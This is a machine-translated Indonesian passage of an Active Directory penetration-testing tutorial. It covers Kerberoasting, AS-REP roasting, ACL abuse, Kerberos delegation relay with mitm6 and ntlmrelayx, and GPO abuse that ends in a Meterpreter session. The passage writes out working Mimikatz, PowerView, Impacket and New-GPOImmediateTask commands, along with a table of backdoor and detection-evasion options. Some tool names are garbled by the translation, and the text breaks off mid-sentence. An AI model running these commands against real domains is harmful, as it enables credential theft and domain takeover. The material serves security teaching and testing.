href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">machosec</a> memperhatikan bahwa kelas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">KerberosRequestorSecurityToken</a> memiliki metode <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">GetRequest</a> , yang mengekstrak bagian terenkripsi dengan kata sandi dari tiket TGS. <br><br>  Alat untuk melakukan serangan: <br><br>  1) Cari catatan SPN <br><br><ul><li>  <a href="">GetUserSPN.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Temukan-PSServiceAccounts.ps1</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Dapatkan-NetUSER -SPN</a> </li><li>  (Get-ADUser -Filter {ServicePrincipalName -ne "$ null"} -Properties ServicePrincipalName) .ServicePrincipalName </li></ul><br>  2) Meminta tiket TGS <br><br><ul><li>  setspn.exe (utilitas Windows asli) </li><li>  Permintaan tiket melalui PowerShell <br><br><pre> <code class="plaintext hljs">Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “&lt;ServicePrincipalName&gt;”</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Minta-SPNTicket</a> </li></ul><br>  Anda dapat melihat tiket yang di-cache saat ini menggunakan perintah klist. <br><br><div class="spoiler">  <b class="spoiler_title">Catatan SPN umum</b> <div class="spoiler_text"><ul><li>  TERMSRV - Remote Desktop </li><li>  SmtpSVC dan SMTP - Mail </li><li>  WSMAN - WinRM </li><li>  ExchangeAB, ExchangeRFR, ExchangeMDM - MS Exchange </li><li>  POP / POP3 - Layanan Pos POP3 </li><li>  IMAP / IMAP4 - Layanan Email IMAP </li><li>  MSSQLSvc - Microsoft SQL Server </li><li>  MONGO - Server Basis Data MongoDB </li><li>  DNS - DNS server </li><li>  HTTP, WWW - Server Web </li><li>  LDAP - LDAP </li><li>  FTP - Server FTP </li></ul><br></div></div><br>  3) Ekspor tiket: <br><br><ul><li>  <a href="">Invoke-Mimikatz -Command</a> '"Kerberos :: list / export"' </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Mimikatz -Command</a> '"Kerberos :: list / export"' </li><li>  <a href="">Invioke-kerberoast</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tgsrepack.py</a> </li></ul><br><br>  Contoh eksekusi otomatis ketiga poin: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">RiskiskSPN</a> <br><br><pre> <code class="bash hljs">Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format <span class="hljs-string"><span class="hljs-string">"Hashcat"</span></span> | Out-File kerberoasting.txt</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Powersploit</a> <br><br><pre> <code class="bash hljs">Invoke-Kerberoast -Domain jet.lab -OutputFormat Hashcat | fl</code> </pre> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">GetUserSPNs.py</a> <br><br><pre> <code class="bash hljs">GetUserSPNs.py -request jet.lab\user:Password</code> </pre> </li></ul><br><h3>  Asreproast </h3><br>  Kerentanannya adalah bahwa pra-otentikasi Kerberos dinonaktifkan.  Dalam hal ini, kami dapat mengirim permintaan AS-REQ ke pengguna yang menonaktifkan otentikasi pra-Kerberos, dan mendapatkan bagian terenkripsi dengan kata sandi. <br><br><img src="https://habrastorage.org/webt/zd/pm/h5/zdpmh5i7cas-s0gtv2uopy2sj14.png"><br><br>  Kerentanan jarang terjadi, karena menonaktifkan praauthentikasi bukanlah pengaturan default. <br><br>  Mencari Pengguna dengan Otentikasi Kerberos Dinonaktifkan: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Powerview</a> <br><br><pre> <code class="bash hljs">Get-DomainUser -PreauthNotRequired -Properties samaccountname -Verbose</code> </pre> </li><li>  Modul Direktori Aktif <br><br><pre> <code class="bash hljs">get-aduser -filter * -properties DoesNotRequirePreAuth | <span class="hljs-built_in"><span class="hljs-built_in">where</span></span> {<span class="hljs-variable"><span class="hljs-variable">$_</span></span>.DoesNotRequirePreAuth -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span> -and <span class="hljs-variable"><span class="hljs-variable">$_</span></span>.Enabled -eq <span class="hljs-string"><span class="hljs-string">"True"</span></span>} | select Name</code> </pre> </li></ul><br>  Mendapatkan bagian yang dienkripsi: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ASREPRoast</a> <br><br><pre> <code class="bash hljs">Invoke-ASREPROast | fl</code> </pre> <br><img src="https://habrastorage.org/webt/i_/o-/vf/i_o-vfbviphgjknolenx_qoesyo.png"></li></ul><br><br><h1>  Serang melalui ACL </h1><br>  ACL dalam konteks domain adalah seperangkat aturan yang menentukan hak akses objek dalam AD.  ACL dapat dikonfigurasikan untuk objek tunggal (misalnya, akun pengguna), atau untuk unit organisasi, misalnya, OU.  Ketika Anda mengkonfigurasi ACL pada OU, semua objek dalam OU akan mewarisi ACL.  ACL berisi entri kontrol akses (ACE) yang menentukan bagaimana SID berinteraksi dengan objek Active Directory. <br><br>  Misalnya, kami memiliki tiga grup: A, B, C, di mana grup C adalah anggota grup B dan grup B adalah anggota grup A. Saat Anda menambahkan tamu ke grup C, tamu tidak hanya akan menjadi anggota grup C, tetapi juga anggota tidak langsung dari grup B dan A. Saat menambahkan akses ke objek domain ke grup A, pengguna tamu juga akan memiliki akses ke objek ini.  Dalam situasi di mana pengguna adalah anggota langsung dari satu grup, dan grup ini adalah anggota tidak langsung dari 50 grup lainnya, mudah untuk kehilangan koneksi izin yang diwarisi. <br><br>  Anda dapat mengambil ACL yang terkait dengan objek dengan menjalankan perintah berikut <br><br><pre> <code class="bash hljs">Get-ObjectACL -Samaccountname Guest -ResolveGUIDs</code> </pre> <br>  Anda dapat menggunakan alat ini untuk mengeksploitasi kesalahan dalam konfigurasi ACL. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Invoke-ACLPwn</a> .  Skrip Powershell mengumpulkan informasi tentang semua ACL di domain menggunakan kolektor BloodHound, SharpHound, dan membangun rantai untuk mendapatkan izin writeDACL.  Setelah rantai dibangun, skrip mengoperasikan setiap langkah rantai.  Urutan skrip: <br><br><ol><li>  Pengguna ditambahkan ke grup yang diperlukan. </li><li>  Dua ACE (Replikasi Direktori Perubahan dan Replikasi Direktori Perubahan SEMUA) ditambahkan ke ACL objek domain. </li><li>  Jika Anda memiliki hak untuk DCSync menggunakan utilitas Mimikatz, kata sandi hash krbtgt pengguna diminta (pengaturan default). </li><li>  Setelah operasi selesai, skrip menghapus semua grup yang ditambahkan dan entri ACE di ACL. </li></ol><br>  Script hanya ditujukan untuk menggunakan izin writeDACL.  Hak akses berikut juga mungkin menarik bagi penyerang: <br><br><ul><li>  ForceChangePassword.  Hak untuk mengubah kata sandi pengguna ketika kata sandi saat ini tidak diketahui.  Operasi dengan PowerSploit - Set-DomainUserPassword. </li><li>  AddMembers.  Hak untuk menambahkan grup, komputer, dan pengguna ke grup.  Pengoperasian dengan PowerSploit - Add-DomainGroupMember. </li><li>  GenericWrite  Hak untuk mengubah atribut suatu objek.  Misalnya, ubah nilai parameter scriptPath.  Lain kali pengguna masuk ke sistem, file yang ditentukan dimulai.  Pengoperasian dengan PowerSploit - Set-DomainObject. </li><li>  Pemilik Tulis.  Hak untuk mengubah pemilik objek.  Pengoperasian dengan PowerSploit - Set-DomainObjectOwner. </li><li>  AllExtendedRights.  Hak untuk menambahkan pengguna ke grup, mengubah kata sandi pengguna, dll. Pengoperasian dengan PowerSploit - Set-DomainUserPassword atau Add-DomainGroupMember. </li></ul><br>  Operasi: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Aktifkan-aclpwn</a> </li></ul><br>  Mulai dari mesin yang ada di domain <br><br><pre> <code class="bash hljs">./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe</code> </pre> <br>  Mulai dari mesin yang tidak ada dalam domain <br><br><pre> <code class="bash hljs">/Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username <span class="hljs-string"><span class="hljs-string">'domain\user'</span></span> -Domain <span class="hljs-string"><span class="hljs-string">'fqdn_of_target_domain'</span></span> -Password <span class="hljs-string"><span class="hljs-string">'Pass'</span></span></code> </pre> <br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">aclpwn.py</a> adalah alat serupa yang ditulis dengan Python </li></ul><br><h3>  Delegasi Kerberos </h3><br>  Pendelegasian wewenang Kerberos memungkinkan Anda menggunakan kembali kredensial pengguna akhir untuk mengakses sumber daya yang dihosting di server lain. <br><br>  Delegasi Kerberos dapat terdiri dari tiga jenis: <br><br><ol><li>  Tidak terbatas (delegasi tidak terbatas).  Satu-satunya opsi delegasi sebelum Windows Server 2003 </li><li>  Delegasi terbatas sejak Windows Server 2003 </li><li>  Delegasi Terkendala Berbasis Sumberdaya  Diperkenalkan pada Windows Server 2012 </li></ol><br><h4>  Delegasi tanpa batas </h4><br>  Di snap-in Active Directory, fitur delegasi tak terbatas yang diaktifkan adalah sebagai berikut: <br><br><img src="https://habrastorage.org/webt/ip/mp/e8/ipmpe8ygslgtbdklbkiseqtwg64.png"><br><br>  Untuk kejelasan, pertimbangkan bagaimana delegasi tak terbatas terjadi pada diagram. <br><br><img src="https://habrastorage.org/webt/1i/p1/wq/1ip1wqkjnc9plqcqzmpkr1rcfwg.png"><br><br><ol><li>  Kata sandi pengguna dikonversi menjadi ntlm hash.  Stempel waktu dienkripsi dengan hash ini dan dikirim ke pengontrol domain untuk meminta tiket TGT. </li><li>  Pengontrol domain memeriksa informasi tentang pengguna (pembatasan masuk, keanggotaan dalam grup, dll.), Membuat tiket TGT dan mengirimkannya kepada pengguna.  Tiket TGT dienkripsi, ditandatangani, dan hanya krbtgt yang dapat membaca datanya. </li><li>  Pengguna meminta tiket TGS untuk mengakses layanan web di server web. </li><li>  Pengontrol domain menyediakan tiket TGS. </li><li>  Pengguna mengirimkan tiket TGT dan TGS ke server web. </li><li>  Akun layanan server web menggunakan tiket TGT pengguna untuk meminta tiket TGS untuk mengakses server database. </li><li>  Akun layanan terhubung ke server database sebagai pengguna. </li></ol><br>  Bahaya utama dari delegasi tak terbatas adalah ketika mesin dengan delegasi tak terbatas dikompromikan, penyerang akan bisa mendapatkan tiket pengguna TGT dari mesin ini dan akses ke sistem apa pun di domain atas nama pengguna ini. <br><br>  Cari mesin dalam domain dengan delegasi tidak terbatas: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Powerview</a> <br><br><pre> <code class="bash hljs">Get-NetComputer -unconstrained</code> </pre> </li><li>  Modul Direktori Aktif <br><br><pre> <code class="bash hljs">Get-Adcomputer -Filter {TrustedForDelegation -eq <span class="hljs-variable"><span class="hljs-variable">$True</span></span>}</code> </pre>  . </li></ul><br>  Ekspor Tiket: <br><br><ul><li>  Menggunakan mimikatz.  sekurlsa :: tiket / ekspor </li><li>  Anda juga dapat melakukan serangan Pass-The-ticket. <br><br><pre> <code class="bash hljs"> kerberos::ptt C:\tickets\.</code> </pre> </li></ul><br><img src="https://habrastorage.org/webt/oa/wa/25/oawa25sduaj5u303b1q9svirdku.gif"><br><br><h4>  Delegasi terbatas </h4><br>  Mode pendelegasian terbatas memungkinkan Anda untuk mengakses hanya layanan yang diizinkan dan pada mesin tertentu.  Di snap-in Active Directory, tampilannya seperti ini: <br><br><img src="https://habrastorage.org/webt/xj/ku/no/xjkunogyspfpevoanui8nzxwlzq.png"><br><br>  Dengan delegasi terbatas, 2 ekstensi protokol Kerberos digunakan: <br><br><ul><li>  S4 diri kita sendiri </li><li>  S4UProxy </li></ul><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">S4U2Self</a> digunakan ketika klien tidak mengautentikasi menggunakan protokol Kerberos. <br><br>  Untuk delegasi tanpa batas, TGT digunakan untuk mengidentifikasi pengguna, dalam hal ini ekstensi S4U menggunakan struktur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PA-FOR-USER</a> sebagai tipe baru di bidang data padata / pra-otentikasi.  Proses S4U2self hanya diperbolehkan jika pengguna yang meminta memiliki bidang TRUSTED_TO_AUTH_FOR_DELEGATION yang disetel di userAccountControl. <br><br><img src="https://habrastorage.org/webt/oo/yk/5s/ooyk5sjtsusxcfkois5ej7dgnua.png"><br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">S4U2Proxy</a> memungkinkan akun layanan menggunakan tiket redirect yang diterima dalam proses S4U2 untuk meminta tiket TGS untuk akses ke layanan yang diizinkan (msds-allowtodelegateto).  KDC memeriksa apakah layanan yang diminta ditentukan dalam bidang msds-allowtodelegateto dari pengguna yang meminta, dan mengeluarkan tiket jika pemeriksaan berhasil.  Dengan demikian, pendelegasian “terbatas” untuk layanan target tertentu. <br><br><img src="https://habrastorage.org/webt/t-/a7/n6/t-a7n6ludbpsvmbk0ru_kwxvpq4.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Anda dapat mencari komputer dan pengguna di domain delegasi terbatas menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cari komputer dengan delegasi tanpa batas</font></font><br><br><pre> <code class="bash hljs">Get-DomainComputer -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Cari pengguna delegasi terbatas </font></font><br><br><pre> <code class="bash hljs">Get-DomainUser -TrustedtoAuth</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Untuk melakukan serangan, kita memerlukan kata sandi yang jelas, hash kata sandi NTLM, atau tiket TGT. </font></font><br><br><img src="https://habrastorage.org/webt/gd/5f/fx/gd5ffxfwmgeqr5j28ovwzcqqacy.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Delegasi Terbatas Berbasis Sumberdaya </font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Seperti halnya delegasi biasa, ekstensi S4U digunakan. Karena delegasi berbasis sumber daya adalah delegasi terbatas, serangan yang relevan dengan delegasi terbatas reguler juga tersedia di sini. Satu-satunya perbedaan adalah bahwa dalam delegasi terbatas sederhana, layanan A harus memiliki </font><font style="vertical-align: inherit;">atribut </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msDS-AllowedToDelegateTo</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = ServiceB, dan di sini layanan B harus memiliki </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msDS-AllowedToActOnBehalfOfOtherIdentity</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> = </font><font style="vertical-align: inherit;">atribut </font><font style="vertical-align: inherit;">Service A. </font></font><br><br><img src="https://habrastorage.org/webt/td/um/jl/tdumjlcportki98xbixgfo1jaiu.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Properti ini memungkinkan satu lagi </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">serangan yang</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> diterbitkan oleh </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">harmj0y</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">Serangan memerlukan izin untuk mengubah parameter PrincipalsAllowedToDelegateToAccount, yang menetapkan msds-AllowedToActOnBehalfOfOtherIdentity atribut, yang berisi daftar kontrol akses (ACL). </font><font style="vertical-align: inherit;">Tidak seperti delegasi yang terbatas, kami tidak memerlukan hak administrator domain untuk mengubah atribut msds-AllowedToActOnBehalfOfOtherIdentity. </font><font style="vertical-align: inherit;">Anda dapat mengetahui siapa yang memiliki izin untuk mengedit atribut sebagai berikut:</font></font><br><br><pre> <code class="plaintext hljs">(Get-acl "AD:$((get-adcomputer Windows7).distinguishedname)").access | Where-Object -Property ActiveDirectoryRights -Match WriteProperty |out-gridview</code> </pre> <br><img src="https://habrastorage.org/webt/ej/4p/bk/ej4pbkl5bkv5y75mqp54mxu0qcm.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Jadi, untuk melakukan serangan, jalankan mitm6 </font></font><br><br><pre> <code class="bash hljs">mitm6 -I vmnet0</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Kami memulai ntlmrelayx dengan opsi --delegate-access </font></font><br><br><pre> <code class="plaintext hljs">ntlmrelayx -t ldaps://dc1.jet.lab --delegate-access</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sebagai akibat dari serangan itu, komputer ZGXTPVYX $ dibuat dengan hak delegasi ke komputer Windows7. </font></font><br><br><pre> <code class="plaintext hljs">$x = Get-ADComputer Windows7 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity $x.'msDS-AllowedToActOnBehalfOfOtherIdentity'.Access</code> </pre><br><img src="https://habrastorage.org/webt/21/oo/w9/21oow9kxnu53sg9wi-xnneus9fc.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Laporan delegasi yang baik </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">disajikan</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> di PHDays oleh Yegor Podmokov.</font></font><br><br><img src="https://habrastorage.org/webt/kr/ri/za/krrizaffbrqgiee3gd2kufqs8s4.gif"><br><br><h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Menyalahgunakan Izin GPO </font></font></h4><br> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Objek Kebijakan Grup</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> adalah alat yang memungkinkan administrator mengelola domain secara efisien. </font><font style="vertical-align: inherit;">Tetapi kebetulan bahwa pengguna diberi hak yang tidak perlu, termasuk untuk mengubah kebijakan GPO. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Untuk mendemonstrasikan contoh, kami akan menambahkan pengguna Ragnar hak untuk mengedit Kebijakan Pengontrol Domain Default (dalam kehidupan nyata, hak untuk kebijakan ini hanya diberikan kepada administrator domain, tetapi esensi serangan tidak berubah; dalam kasus kebijakan lain, hanya host yang dikendalikan yang berubah). </font></font><br><br><img src="https://habrastorage.org/webt/yw/on/ht/ywonhtpbkwdqffjvzck5hdhjgza.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Hitung hak semua GPO di domain menggunakan </font></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerView</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> .</font></font><br><br><pre> <code class="plaintext hljs">Get-NetGPO | % {Get-ObjectAcl -ResolveGUIDs -Name $_.Name}</code> </pre> <br><img src="https://habrastorage.org/webt/fk/cf/sk/fkcfskfmeohuicn13_76t190miy.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Pengguna Ragnar memiliki hak untuk mengubah GPO yang memiliki GUID 6AC1786C-016F-11D2-945F-00C04FB984F9. </font><font style="vertical-align: inherit;">Untuk menentukan host di domain mana yang menerapkan kebijakan ini, jalankan perintah berikut</font></font><br><br><pre> <code class="plaintext hljs">Get-NetOU -GUID "6AC1786C-016F-11D2-945F-00C04FB984F9" | % {Get-NetComputer -AdSpath $_}</code> </pre> <br><img src="https://habrastorage.org/webt/ou/ut/9c/ouut9cizgebvp9q_dkoifqlqgic.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mendapat host dc1.jet.lab. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mengetahui kebijakan khusus yang dapat diedit pengguna Ragnar dan host yang menerapkan kebijakan ini, kita dapat melakukan berbagai tindakan pada host dc1.jet.lab.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Di bawah ini adalah opsi untuk menggunakan GPO</font></font></b> <div class="spoiler_text"><div class="scrollable-table"><table><tbody><tr><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Konfigurasi Komputer \ Preferensi \ Pengaturan Panel Kontrol \ Opsi Folder </font></font></td><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Buat / ubah asosiasi tipe file, daftarkan tindakan DDE dengan asosiasi tersebut </font></font></td></tr><tr><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Konfigurasi Komputer \ Preferensi \ Pengaturan Panel Kontrol \ Pengguna dan Grup Lokal </font></font></td><td><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Tambahkan akun admin lokal baru </font></font></td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Scheduled Tasks </td><td> Deploy a new evil scheduled task (ie: PowerShell download cradle) </td></tr><tr><td> Computer Configuration\Preferences\Control Panel Settings\Services </td><td> Create and configure new evil services </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Affected computers will download a file from the domain controller </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\INI Files </td><td> Update existing INI files </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Registry </td><td> Update specific registry keys. Very useful for disabling security mechanisms, or triggering code execution in any number of ways </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Shortcuts </td><td> Deploy a new evil shortcut </td></tr><tr><td> Computer Configuration\Policies\Software Settings\Software installation </td><td> Deploy an evil MSI. The MSI must be available to the GP client via a network share </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Scripts (startup/shutdown) </td><td> Configure and deploy evil startup scripts. Can run scripts out of GPO directory, can also run PowerShell commands with arguments </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\Audit Policy </td><td> Modify local audit settings. Useful for evading detection </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment\ </td><td> Grant a user the right to logon via RDP, grant a user SeDebugPrivilege, grant a user the right to load device drivers, grant a user seTakeOwnershipPrivilege. Basically, take over the remote computer without ever being an administrator on it </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Registry </td><td> Alter DACLs on registry keys, grant yourself an extremely hard to find backdoor on the system </td></tr><tr><td> Computer Configuration\Policies\Windows Settings\Security Settings\Windows Firewall </td><td> Manage the Windows firewall. Open up ports if they're blocked </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Environment </td><td> Add UNC path for DLL side loading </td></tr><tr><td> Computer Configuration\Preferences\Windows Settings\Files </td><td> Copy a file from a remote UNC path </td></tr></tbody></table></div><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Alat </font></font><a href=""><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">New-GPOImmediateTask</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SharpGPOAbuse</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> memungkinkan Anda untuk:</font></font><br><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Jalankan tugas di penjadwal tugas </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Tambahkan hak pengguna (SeDebugPrivilege, SeTakeOwnershipPrivilege, dll.) </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Tambahkan skrip yang berjalan setelah startup </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Tambahkan pengguna ke grup lokal </font></font></li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Misalnya, tambahkan tugas di penjadwal tugas untuk mendapatkan sesi Meterpreter: </font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -TaskName test3 -GPODisplayName "Default Domain Controllers Policy" -CommandArguments '&lt;powershell_meterepreter_payload&gt;' -Force</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Setelah eksekusi, tugas yang dijadwalkan muncul tes </font></font><br><br><img src="https://habrastorage.org/webt/dr/au/v8/drauv8km1pwp56jt_reymw8d5gw.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dan sesi Meterpreter muncul.Untuk </font></font><br><br><img src="https://habrastorage.org/webt/js/e6/g8/jse6g8vqatvnvr5h1qlx2mvrvzq.png"><br><br><img src="https://habrastorage.org/webt/zj/ct/wz/zjctwz7ca8xg5j6zbqoqlf3q9w0.gif"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">menghapus tugas yang dijadwalkan, Anda perlu menjalankan perintah berikut:</font></font><br><br><pre> <code class="plaintext hljs">New-GPOImmediateTask -Remove -Force -GPODisplayName SecurePolicy</code> </pre> <br><h1>  Kesimpulan </h1><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dalam artikel kami hanya memeriksa beberapa vektor serangan. </font><font style="vertical-align: inherit;">Tampilan seperti </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Enumerate Accounts dan semprotan Kata Sandi</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MS14-068</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , sekelompok </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font 